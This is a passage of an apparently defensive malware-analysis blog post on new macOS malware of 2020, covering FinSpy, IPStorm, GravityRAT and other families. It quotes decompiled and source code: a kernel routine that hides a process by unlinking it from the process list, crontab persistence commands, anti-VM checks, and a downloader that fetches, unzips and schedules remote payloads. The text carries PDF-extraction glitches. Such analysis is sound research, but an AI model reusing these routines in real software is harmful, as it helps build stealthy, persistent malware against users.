"FinSpy for Mac OS ...follow(s) a modular design. The launcher `logind` only instantiates the core component `dataPkg`,which oversees communications with the Command and Control server (C&C), and decrypting/launching modules whenneeded. The modules are encrypted with the AES algorithm and compressed with the `aplib` compression library. The AESkey is stored in the binary, but the IV is stored in each con.guration .le along with a MD5 hash of the .nal decompressed.le." 

Another interesting capability of this malware is its kernel-mode rootkit functionality. Simply put, (public) macOS malware with ring-0capabilities is rare! 
The .le logind.kextis FinSpy’s kernel extension …though it is unsigned: 

As the kernel extension is unsigned, it won’t run on any recent version of macOS (which enforce kextcode signing requirements). 
It terms of it’s functionality, it appears to be a simple process hider. 
In a function named ph_init, the kernel extension looks up a bunch of kernel symbols (via a function namedksym_resolve_symbol_by_crc32): 

 5 
 6  ... 
 7 
 8 9 10 11 12  rax = ksym_resolve_symbol_by_crc32(0xfffffffffef1d247, rsi, rdx, rcx);*_LCK_LCK = rax;if (rax != 0x0)*_LCK_LCK = *rax;  
13  ...  
14  
1516 17 18 19  rax = ksym_resolve_symbol_by_crc32(0x392ec7ae, rsi, rdx, rcx);*_LCK_MTX_LOCK = rax;if (rax != 0x0)*_LCK_MTX_UNLOCK = ksym_resolve_symbol_by_crc32(0x2472817c, rsi, rdx, rcx);  
20  
21 22 }  return;  

Based on variable names, it appears that logind.kext is attempting to resolve the pointer of the kernel’s global list of proc (process) structures, as well as various locks. 
In a function named ph_hide the kext will hide a process. This is done by walking the list of proc structures (pointed to by _ALLPROC_ADDRESS), and looking for the one that matches (to hide):
 1 void _ph_hide(int arg0) {2 3 r14 = arg0;4 if (r14 == 0x0) return;5 6 r15 = *_ALLPROC_ADDRESS;7 if (r15 == 0x0) goto return;8 9 SEARCH: 
10 11 rax = proc_pid(r15);12 rbx = *r15;13 if (rax == r14) goto HIDE;14 15 loc_15da: 16 r15 = rbx;17 if (rbx != 0x0) goto SEARCH;18 19 return;20 21 HIDE: 22 r14 = *(r15 + 0x8);23 (*_LCK_MTX_LOCK)(*_LCK_LCK);24 *r14 = rbx;25 *(rbx + 0x8) = r14;26 (*_LCK_MTX_UNLOCK)(*_LCK_LCK);27 return;
28 } 
In the above code, note that HIDE contains the logic to remove the target process of interest, by unlinking it from the (process) list. Once removed, the process is now (relatively) “hidden”. (Of course one can leverage XNU level APIs to uncover such process hiding). 
The malicious kext also appears to be able to communicate with user-mode via the .le /tmp/launchd-935.U3xqZw. Speci.cally, in a function named ksym_init, it will open and read in the contents of this .le (which may contain details of the process to hide?):
 1 void ksym_init(int arg0, int arg1) {2 *(int32_t *)_MKI_SIZE = fileio_get_file_size("/tmp/launchd-935.U3xqZw", arg1);3 rax = _OSMalloc_Tagalloc("MKI", 0x0);4 *_MKI_TAG = rax;5 if (rax == 0x0) goto .l1; 
 6 7 loc_1898: 8 rax = _OSMalloc(*(int32_t *)_MKI_SIZE, rax);9 *_MKI_BUFFER = rax;
10 if (rax == 0x0) goto loc_1921;11 12 loc_18b2: 13 if (fileio_read_file_fully("/tmp/launchd-935.U3xqZw", rax) == 0x0) goto loc_1908;14 15 .... 
16 } 
For more on the topic of Mac rootkits, see: 
"Revisiting Mac OS X Kernel Rootkits" 

IPStorm 
IPStorm is a cross platform botnet, now ported to macOS. Though it’s capabilities are limited onmacOS, it support a reverse shell, ad faud, and more. 

Download: IPStorm (password: infect3d) 
In early October researchers a Intezer published a report about IPStorm being ported from Windows to Linux…and also macOS: 
"Our research team recently identi.ed new Linux variants of IPStorm targeting various Linux architectures (ARM, AMD64,Intel 80386) and platforms (servers, Android, IoT). We have also detected a macOS variant." -Intezer 
The macOS version of IPStorm is packed with the UPX packer. Luckily we can use UPX itself (via the -d.ag) to completely unpack the malware: 

…once unpacked, analysis can commence. 

Writeups: 
“A Storm is Brewing: IPStorm Now Has Linux Malware” “GravityRAT and IPStorm: Mac Malware, Ported from Windows” 

Infection Vector: SSH Brute Forcing(?) 
It is not clear how IPStorm infects macOS systems. However, the Intezer report notes that the malware can spread via SSH brute-forcing: 
"The [malware] attempts to spread and infect other victims on the internet by using SSH brute-force. Once a connection is
established ...it will proceed to download the payload and infect the server." -Intezer 
At address 00000000046e70b0we .nd a function named storm/scan_tools/ssh.brute …that if successfully brute-forces a SSH connection on a remote system will call storm/scan_tools/ssh.InstallPayload. This function will ascertain the architecture of the (newly) accessed system (via a call to storm/scan_tools/ssh.SystemInfo.GoArch), and the proceeds to download the appropriate payload (via storm/statik.GetFileContents). 
Once the payload has been downloaded to the remote system, IPStorminvokes a function named ssh.(*Session).Start… which eventually calls runtime.newprocto (likely) kick o. the payload on th remote system. 


Persistence: None(?) 
While the Windows and Linux versions of IPStormwill persist, it does not appear that the macOS version supports persistence. The Intezer report details a function in the Linux variant, filetransfer.(*File).Persistthat, “archives persistence”. We .nd this same function in the macOS version (at address 0x004491620) …however it does not appear to contain any persistence 
logic, but instead references the string "Persist not implemented on platform %s": 

Moreover executing the malware (in a virtual machine) does not generate any persistent events. 

Capabilities: Remote Shell, Ad Faud, etc... 
During their analysis of the Linux variant, the Intezer researchers noted that IPStorm would create a reverse shell via functions named backshell.*. 
We .nd these same functions in the macOS variant: 

backshell.* functions 
Taking a peek at the backshell.openLocalShell function reveals it invoking powershell.(*Backend).StartProcess… passing in bash 

Looking at sockets on an infected system (via our tool Netiquette), we .nd that the malware has created a listening socket on a high port: Listening Socket 

…this might indicate that the malware creates a listener socket in process to facilitate the reverse shell (and perhaps passes the commandsthen to bashto execute). 
In the Intezer report, the researches noted that the Linux version of IPStormalso engages in fraudulent activities: 
"IPStorm’s Linux variant takes advantage of its being widespread to perform di.erent fraudulent activity in the background,abusing gaming and ads monetization. Because it’s a botnet, the malware utilizes the large amount of requests from di.erent trusted sources, thus not being blocked nor traceable." -Intezer 
By sni.ng network tra.c we can con.rm that the macOS variant also engages in such activities …speci.cally fraudulent ad monetization: 

Fraudulent Ad Monetization 
…to a large number of remote IP addresses (though some may be other members of the botnet, or SSH brute-force attempts): So ... Many ... Connections 


GravityRat 
GravityRat is cross-platform remote administration tool (RAT …backdoor) now ported to macOS. The(available) samples, are persistent first-stage downloaders. 

Download: GravityRAT (password: infect3d) 
In October, Kaspersky published a new report on the intriguing cross-platform spyware, GravityRAT("used to target the Indian armed forces"). In this report, they noted that for the .rst time, “there are now versions for …macOS”. 
The Kaspersky repprt mentioned several samples (of trojanized applications) that were all persistent .rst-stage downloaders. 

…here, we’ll focus mainly on the Enigmasample (086b22075d464b327a2bcbf8b66736560a215347) and StrongBoxsample (e33894042f3798516967471d0ce1e92d10dec756). 

Writeups: “GravityRAT: The spy returns” 
“Adventures in Anti-Gravity (Part 1)" 
“Adventures in Anti-Gravity (Part 2)" 

Infection Vector: Trojanized Applications Kaspersky’s report notes that (at least one sample of) the Windows versions was “downloaded from the site enigma.net[.]in under the guise of a secure .le sharing app to protect against ransomware”. The macOS version (Enigma) also appears to masquerade as such an application: 

Enigma's user interface It’s unknown how the user is coerced into downloading and running the trojaned application, but it they do - they may end up infected. …may, as the sample(s) are unsigned: 

…meaning that on recent version of macOS (Gatekeeper) will block them (unless the user manually removes the quarantine attribute, or ifdistirbuted in a .pkg, clicks through various warnings). 

Persistence: Cron Job (of a 2nd-stage payload) The samples themselves, don’t appear to persist. However, (2nd-stage) payloads that are downloaded, are persisted (by the malware). The Kaspersky report, notes, “The Mac version …adds a cron job” For the Enigmasample, we .nd this persistence logic in a function named format: 
 1 def format(self, src, des, uc):2 ... 3 if not os.path.isfile(des):4 os.system('cp ' + src + ' ' + des)5 if des[-3:] == '.py': 6 os.system('sudo crontab -l 2>/dev/null;7 echo "*/2 * * * * python ' + des + '" | sudo crontab -')8 else: 9 os.chmod(des, 448)
10 des +=' '+ uc 11 os.system('sudo crontab -l 2>/dev/null;12 echo "*/2 * * * * ' + des + '"| sudo crontab -')13 return '+O ' 
Via crontab the malware persists a downloaded .le (a 2nd-stage payload), as a cron job. This malicious cron job is set to run every two minutes (*/2 * * * *). 
The StrongBoxsample also persists a downloaded .le, via a function scheduleMacto persist and launch the downloaded payload. The scheduleMac function persists the downloaded payload as cron job, via the builtin crontabcommand:
 1 function scheduleMac(fname,agentTask)2{3 ... 4 var poshellMac = loclpth+"/"+fname;5 execTask('chmod -R 0700 ' + "\"" + + "\"" );6 7 ... 8 arg = agentTask;9 execTask('crontab -l 2>/dev/null;
10 echo \' */2 * * * * '+"\""+poshellMac+"\" "+arg+'\' 11 | crontab -', puts22);
12 } 
…the persisted payload, will be (re)launched every two minutes (*/2 * * * * ). 

Capabilities: 1st-stage downloader The macOS GravityRat samples appear to simply be 1st-stage downloaders …as the reach out to a remote command & control servers to download (and persist) 2nd-stage payloads. 
Before downloading and persisting the next stage payloads though, the malware performs several checks (implemented in the themain.js.le): 
Check if running in a VMCheck if not connected to the Internet Check if not running with Full Disk Access (FDA) 
Let’s take a closer look at each of these. 
The aptly named function, VMCheck, checks if the application is running within a Virtual Machine. Virtual machine checks are commonly found in malware, in an attempt to ascertain if a malware analyst is (likely) examining the code (in a virtual machine). 

13  
14  ...  
15  
16  const options = { 
17  type: 'question', 
18  buttons: ['Ok'], 
19  defaultId: 2, 
20  title: 'StrongBOX - Operation Not Permitted in VirtualBOX', 
21  message: 'Action Required', 
22  detail: 'StrongBOX - Unable to load components\n 
23  Please exit virtual mode to launch the application.' 
24  }; 
25  

26 dialog.showMessageBox(null, options, (response, checkboxChecked) => {27 app.quit();28 app.exit();29 }); 
…pretty easy to see its checking if the passed in parameter (stdout) contains strings related to popular virtual machine products (e.g. VMware). So what’s in the stdout parameter? Well, if the malware is running on a macOS system, the VMCheckfunction will be invoked from within a function named Vmm: 
1 function Vmm() {2 var modname = exec("system_profiler SPHardwareDataType | grep 'Model Name'");3 var smc = exec("system_profiler SPHardwareDataType | grep 'SMC'");4 var modid = exec("system_profiler SPHardwareDataType | grep 'Model Identifier'");5 var rom = exec("system_profiler SPHardwareDataType | grep 'ROM'");6 var snum = exec("system_profiler SPHardwareDataType | grep 'Serial Number'");7 VMCheck(modname + smc + modid + rom + snum);
8} 
The Vmm function gets the system identifying information such as the model name, model identi.er, serial number and more. If executed within a virtual machine, this information will contain VM-related strings: 

…thus the malware will be able to detect it’s running within a virtual machine …and display an error message
 1 function VMCheck(stdout) {
2 
 3  ... 
 4 
 5  const options = { 
6  type: 'question', 
7  buttons: ['Ok'], 
8  defaultId: 2, 
9  title: 'StrongBOX - Operation Not Permitted', 
10  message: 'Oops!! Something went wrong. ', 
11  detail: 'Please check your internet connection and try again.' 
12  }; 
13  
14  dialog.showMessageBox(null, options, (response, checkboxChecked) => { 
15  app.quit();  


However, it appears that perhaps there is bug in the malware’s code, and an incorrect error message will be displayed … “Please check your internet connection and try again.": 

(incorrect) Error Message 
The main.js .le also contains logic for a simple “is connected” check. Often malware performs such checks to ensure it can communicate with a remote command and control server, and/or to detect if it is perhaps executing on an o.ine analysis system. 
To ascertain if it’s running on an Internet connection system, the malware invokes a function named connectionwhich simply attempts to ping www.google.com:
 1 function connection(){
2 3 4 5 6 7 8 9 10 1112  execRoot('ping -t 4 www.google.com', function(error, stdout, stderr){if(error || error !== null){const options = {type: 'question',buttons: ['Ok'],defaultId: 2,title: 'Internet Connectivity Required',message: 'Action Required',detail: "Sorry! Please check your internet connectivity and try again."};  
13 14 15 1617  dialog.showMessageBox(null, options, (response, checkboxChecked) => { app.quit(); app.exit();});  
18  } }); 

19 } 
Via our Process Monitor, we can observe this execution of the pingcommand: 


Lastly the main.js function checks if the malware has been granted Full Disk Access (FDA). 
On recent versions of macOS, applications are prevented from accessing various user/system files,
unless the user has manually granted the application “Full Disk Access” (via the System Preferences
application). 
As such, malware that desires indiscriminate file system access may attempt to coerce users into
granting such access. 
In order to check if has Full Disk Access, GravityRatattempts to list the .les in the ~/Library/Safari. As this directory is inaccessible to applications without FDA, this is su.cient check. If the malware determines it does not have FDA, it will prompt to the user to grant such access:
 1 var ressslt = execRoot('ls ~/Library/Safari', function(err, data, stderr){
2 
 3 4 5 6 7 8 9 10 11  if(!data || data ==""){const options = {type: 'question',buttons: ['Ok'],defaultId: 2,title: 'StrongBox - Operation Not Permitted', message: 'Action Required',detail: "Please follow the instructions to resolve this issue  
121314  };  System Preferences -> Security & Privacy ->Full Disk Access to Terminal.app"  

15 
16 dialog.showMessageBox(null, options, (response, checkboxChecked) => {17 app.quit();18 app.exit();19 });20 
21
 } });

22 
} 


In the StrongBoxsample, the main.js .le contains logic related to environmental checks (i.e. VM & FDA checks), the core of the malicious logic appears in the signature.js .le. As such, let’s now we dive into the signature.js.le. 
At the start of the signature.js.le we .nd various variables being initialized: 

These variable appear to the malware’s command and control server and a directory path, found within the user application data directory(that we’ll see is used for persistence). 
The malware’s server, download.strongbox.in, appears to be now offline: 
$ nslookup download.strongbox.in Server: 8.8.8.8 Address: 8.8.8.8#53 
** server can’t find download.strongbox.in: SERVFAIL 
The code snippet, getPath(‘appData’), will return the “Per-user application data directory”, which onmacOS points to ~/Library/Application Support. 
If needed, the malware then will create the directory speci.ed in the loclpthvariable (~/Library/ApplicationSupport/SCloud): 

Further down in the signature.js .le, we can see the malware invoking a function named updatesvia the setIntervalAPI: 

As its name implies, the updates will download a .le (and “update”) from the server speci.ed in the srdrvariable (https://download.strongbox.in/A0B74607.php):
 1 function updates()
2{
3 4 5 6 7  const insst = axios.create();var hash = store.get('Hash')axios.post(srdr, {value: 'update',hash: hash 
 8 910 11 12 13 14 1516  }) .then((response) => { var respns = response.data;if(respns){ var rply = respns.split('#'); var fname = rply[0].trim(); var agentTask = rply[1];}  
17  ...  
18  
19 20 21 22 23 24 25 26 27 2829  var dpath;if(osvar.trim()=="darwin") var file = fs.createWriteStream(dpath); var request = https.get(srur+'Updates/' + fname, function(response) { response.pipe(file);file.on('finish', function() {getDateTime();extractzip1(fname,agentTask);file.close();});  
30  ...  

31 } 
If this remote server (https://download.strongbox.in/A0B74607.php), provides a payload for download, the malware will then invoke the extractzip1function: 
 1 function extractzip1(fname,agentTask)2{
3 
 4 5 6 7 8 910  var source;var sourceTozip;if(osvar.trim()=="darwin") {source = loclpth+"/"+fname;sourceTozip = source+".zip";}  
11  ...  
12 13  fs.rename(source, sourceTozip, function(err) {  
1415  });  
16  
17 18 19 20 21  if(osvar.trim()=="darwin") { var extract = require('extract-zip') var target= loclpth; extract(sourceTozip, {dir: target}, function (err) {  
22  ...  
23 242526 scheduleMac(fname,agentTask);}});} 

27 } 
After appending .zip, the malware extracts the downloaded (zip) .le to the location speci.ed in the loclpthvariable (~/Library/Application Support/SCloud). Once extracted it invokes a function we discussed earlier scheduleMac…which persists (as a cronjob) and launches the downloaded payload. 
Unfortunately the remote servers (e.g. download.strongbox.in) are now o.ine, and as such, the 2nd stage payloads are not available for analysis.
 And All Others 
This blog post provided a comprehensive technical analysis of the new mac malware of 2020. However it did not cover adware or malwarefrom previous years. Of course, this is not to say such items are unimportant …especially when such adware is notarized (to bypass Apple’snew security checks), or when existing malware is updated. 
As such, here we include a list (and links to detailed writeups) of other notable items from 2020, for the interested reader. 
Shlayer/ Vindinstaller Dropper 
In June, Intego researchers uncovered: 
"...a new [adware dropper] in the wild, actively spreading through malicious results in Google searches. 
Intego identi.es the [adware dropper] as unique new variants of OSX/Shlayer (the original variant of which was .rstdiscovered by Intego in 2018) and OSX/Bundlore (with similarities to past versions of OSX/MacO.ers and Mughthesec/BundleMeUp/Adload)” -Intego 

Adware Dropper (credit: Intego) 
Writeup(s): “New Mac malware reveals Google searches can be unsafe” “How a New macOS Malware Dropper Delivers VindInstaller Adware” 

OSX.GMERA(new campaign) 
In July, ESET researchers lured GMERA malware operators “to remotely control their Mac honeypots”. 
"To learn more about the intentions of this group, we set up honeypots where we monitored all interactions betweenthe GMERA reverse shell backdoors and the operators of this malware." -ESET 

GMERA (run.sh) (credit: ESET) 
We covered OSX.GMERAin our “Mac malware of 2019 report”, although ESET researchers report is noteworthy (in the context of 2020), as they uncovered a new campaign leveraging this malware. 
Writeup: “Mac cryptocurrency trading application rebranded, bundled with malware” 

 Notarized Adware 
In August, Peter Dantini (@PokeCaptain) noticed that the website homebrew.sh (not to be confused with the legitimate Homebrew website brew.sh), was hosting an active adware campaign 
…and that the adware has been notarized (read: approved) by Apple: 

Notarized Adware 
This means even on Big Sur, the adware will (still) be allowed to run! 
In Apple’s own words, notarization was supposed to “give users more con.dence that [software] …has been checked by Apple for malicious components.” …maybe not? 
Writeup: “Apple Approved Malware” 

Bundalor Dropper 
In November, SentinelOne researchers published a report on an adware installer that (ab)used resource forks to store its maliciouspayloads. …the adware installer also provided user-instructions to “bypass” macOS’s latest malware mitigations (e.g. notarization): 

Adware Dropper (credit: SentinelOne) 
Writeup: 
 “Resourceful macOS Malware Hides in Named Fork” 

OSX.OceanLotus(new variant) 
Also in November, TrendMicro researchers discovered a backdoor that they tied to the OceanLotus Group. Upon closer analysis, theapplication (which masquerades as O.ce documents) appears to be an updated variant of OSX.OceanLotus.F: 
"Due to similarities in dynamic behavior and code with previous OceanLotus samples, it was con.rmed to be a variantof the said malware [OSX.OceanLotus.F]" -TrendMicro 

OceanLotus (credit: TrendMicro) 
Writeup: “New MacOS Backdoor Connected to OceanLotus Surfaces” 
Detections 
New malware is notoriously di.cult to detect via traditional signature-based approaches …as, well, it’s new! A far better approach is toleverage heuristics or behaviors, that can detect such malware, even with no a priori knowledge of the speci.c (new) threats. 
For example, imagine you open an O.ce Document that (unbeknownst to you) contains an exploit or malicious macros which installs apersistent backdoor. This is clearly an unusual behavior, that should be detected and alerted upon. 
Good news, our free macOS security tools do not leverage signatures, but instead monitor for such (unusual, and likely malicious)behaviors. This allows them to detect and alert on various behaviors of all the new malware of 2020 (with no prior knowledge of themalware). 
For example, let’s look at how OSX.Dacls was be detected by our free tools: 
BlockBlock readily detects when the malware’s attempts to persist as a launch item (com.aex-loop.agent.plist. 
~/Library/.mina): 

LuLu detects the malware’s unauthorized network communications to the attackers' remote command & control server (~/Library/.mina. 67.43.239.146): 

KnockKnock can scan a system and generically if it is infected with OSX.Dacls, by detecting its launch item persistence (com.aex-loop.agent.plist. ~/Library/.mina): 

Recall that OSX.EvilQuest would ransom a user’s .les. Well good news, our RansomWhere? utility could both detect and stop this malicious behavior in its tracks: 

The other new malware samples are similarly detected when they persist, generate an unauthorized network connection, or perform othermalicious actions. 
For more information about our free tools, see: Objective-See's Tools. 
Conclusion: 
Well that’s a wrap! Thanks for joining our “journey” as we wandered through the macOS malware of 2020. 
With the continued growth and popularity of macOS (especially in the enterprise!), 2021 will surely bring a bevy of new macOS malware. …so, stay safe out there! And if you’d like to learn more about macOS malware and malware analysis techniques, I’ve written an entire (free) book on this very topic: 

The Art Of Mac Malware, Vol. 0x1: Analysis 
Love these blog posts?Support my tools & writing on :)patreon© 2020 objective-see llc support us! ! 
. 



